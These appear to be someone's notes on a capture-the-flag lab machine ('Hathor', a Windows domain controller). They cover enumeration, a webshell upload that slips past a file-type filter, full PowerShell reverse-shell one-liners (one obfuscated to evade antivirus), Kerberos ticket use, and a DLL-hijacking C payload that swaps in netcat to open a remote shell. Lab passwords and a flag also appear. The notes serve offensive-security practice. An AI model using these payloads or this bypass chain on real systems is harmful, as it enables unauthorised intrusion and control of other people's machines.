# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/hathor 10.10.11.147
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Home - mojoPortal
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-05 05:32:52Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2023-04-05T05:09:56
|_Not valid after:  2024-04-04T05:09:56
|_ssl-date: 2023-04-05T05:35:48+00:00; -17s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2023-04-05T05:09:56
|_Not valid after:  2024-04-04T05:09:56
|_ssl-date: 2023-04-05T05:35:48+00:00; -17s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2023-04-05T05:09:56
|_Not valid after:  2024-04-04T05:09:56
|_ssl-date: 2023-04-05T05:35:48+00:00; -17s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2023-04-05T05:09:56
|_Not valid after:  2024-04-04T05:09:56
|_ssl-date: 2023-04-05T05:35:48+00:00; -17s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/5%Time=642D081A%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: HATHOR; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -17s, deviation: 0s, median: -17s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-04-05T05:35:10
|_  start_date: N/A

```

Hostnames:
`windcorp.htb` and `hathor.windcorp.htb`

Due to ldap and kerberos this is probs the domain controller.

## Website
Recover password page leaks valid users.

When creating a user and logging in you can see the members list which only has admin.

lol default creds work for `admin@admin.com:admin`


# Admin on website
We can upload a file so aspx webshell time.

File type gets blocked.

add `.txt` to the end which works.

File is uploaded here: `http://10.10.11.147/Data/Sites/1/media/cmd.aspx.txt`

When copying the file you can change the ext.

## Webshell
we are the web user so going to try to get a rev shell.
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.25',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

This gets blocked by AV, you can check by doing this:
```
rev.ps1 | iconv -t utf-16le | base64 -w 0
```

Then passing that to the shell with `2>&1` 

Basic obfsucation.
```powershell
$cx = New-Object System.Net.Sockets.TCPClient('10.10.14.25',9001);$stream = $cx.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'shell =>';$sbyte = ([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sbyte,0,$sbyte.Length);$stream.Flush()};$cx.Close()
```

Still get an error, this time about core modules. So maybe constrained language mode?
```
LanguageMode                  : ConstrainedLanguage
```

boo.

Trying to upload nc gives an applocker error.

Looking at applocker rules:
```
%OSDRIVE%\Get-bADpasswords\PSI\Psi_x64.dll
%OSDRIVE%\share\scripts\7-zip64.dll
Signed by CN=ADMINISTRATOR, CN=USERS, DC=WINDCORP, DC=COM
Signed by O=AUTOIT CONSULTING LTD, L=BIRMINGHAM, C=GB
%OSDRIVE%\script\login.cmd
```

Looking at whats on the box there is a `Get-bADpasswords` directory which shows that a user has a weak password:
```
BeatriceMill:!!!!ilovegood17
```

smbshares?
```
session setup failed: NT_STATUS_NOT_SUPPORTED
```

Well this isn't fun.

## Kerberos magic
using impacket to get a TGT.
```
python3 /opt/impacket/examples/getTGT.py windcorp.htb/beatricemill
```

Have to update the `/etc/krb5.conf` file and `resolve.conf`

Then:
```
KRB5CCNAME=beatricemill.ccache smbclient -k -U beatricemill@windcorp.htb -L //hathor.windcorp.htb
```

Time to get a proper rev shell

Going to use insomnia shell.

# Shell as webserver

Enumerate firewall.
```powershell
Get-Netfirewallrule -policystore activestore | where {$_.Action -eq "Block"}|select displayname

cscript64   
cscript32   
ps32        
ps64        
ps ISE32    
ps ISE64    
regsvr32-64 
regsvr32-32 
rundll32-64 
rundll32-32 
wscript32   
wscript64   
certutil64  
certutil32  
certoc      
Block Autoit
```

Block Autoit is weird.

```powershell
Get-NetFirewallRule -PolicyStore ActiveStore -Name "{D7871DF0-F71B-4BD0-B7DE-F8E6966A3640}" | Get-NetFirewallApplicationFilter

C:\share\AutoIt3_x64.exe
```

## DLL hijacking
make dll.
```c
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
  switch(dwReason)
  {
    case DLL_PROCESS_ATTACH:
      system("cmd.exe /c ping 10.10.14.25");
      break;
  }
  return TRUE;
}

```

Compile it:
```
x86_64-w64-mingw32-gcc-win32 dll.c -o 7-zip64.dll -shared
```

use 7-zip64.dll as we can replace that file in smb.

This works and send a ping back. :)

Let's change the dll so it checks permissions on files in the share drive.
```c
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
  switch(dwReason)
  {
    case DLL_PROCESS_ATTACH:
      system("cmd.exe /c ping 10.10.14.25");
      system("cmd.exe /c whoami /all >> C:\\users\\public\\out.txt");
      system("cmd.exe /c icacls C:\\share >> C:\\users\\public\\out.txt");
      system("cmd.exe /c icacls C:\\share\\* >> C:\\users\\public\\out.txt");
      system("cmd.exe /c icacls C:\\share\\scripts\\* >> C:\\users\\public\\out.txt");
      break;
  }
  return TRUE;
}

```

Runs as ginawild, this account is part of ITDep which has Writeowner on Bginfo64.exe.

So what we can do is give this user full access over BGinfo64.exe then change that file to be netcat and get a rev shell. This will bypass the applocker rule. (also have to drop nc on the box make sure to put it in `users\public.`)

```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
  switch(dwReason)
  {
    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c takeown /F C:\\share\\Bginfo64.exe");
        system("cmd.exe /c cacls C:\\share\\Bginfo64.exe /E /G ginawild:F");
        system("cmd.exe /c copy C:\\inetpub\\wwwroot\\data\\sites\\1\\media\\nc64.exe C:\\share\\Bginfo64.exe");
        system("cmd.exe /c C:\\share\\Bginfo64.exe -e cmd 10.10.14.25 9001");
      break;
  }
  return TRUE;
}

```

We get back a shell!

User.txt
```
8a12c8fb0d814e1e4a400753b1dfd9c9
```

# Shell as ginawild
pfx file in recycling bin.

Its encrypted so going to crack it with crackpkcs12

password of abceasyas123